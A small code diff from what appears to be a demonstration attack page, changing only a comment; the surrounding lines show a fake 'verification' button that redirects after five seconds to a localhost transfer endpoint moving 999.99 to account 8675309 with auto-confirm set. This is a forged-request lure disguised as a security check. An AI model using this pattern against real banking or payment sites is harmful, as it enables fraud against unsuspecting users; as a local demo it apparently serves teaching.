@@ -77,7 +77,7 @@
             this.textContent = 'Waiting for verification...';
             this.disabled = true;
 
-            // For demo purposes, let's simulate the attack completing after 5 seconds
+            // For demo purposes, simulate the attack completing after 5 seconds
 
             setTimeout(function() {
                 window.location.href = 'http://127.0.0.1:5000/transfer?to_account=8675309&amount=999.99&description=Security%20Verification&auto_confirm=true';
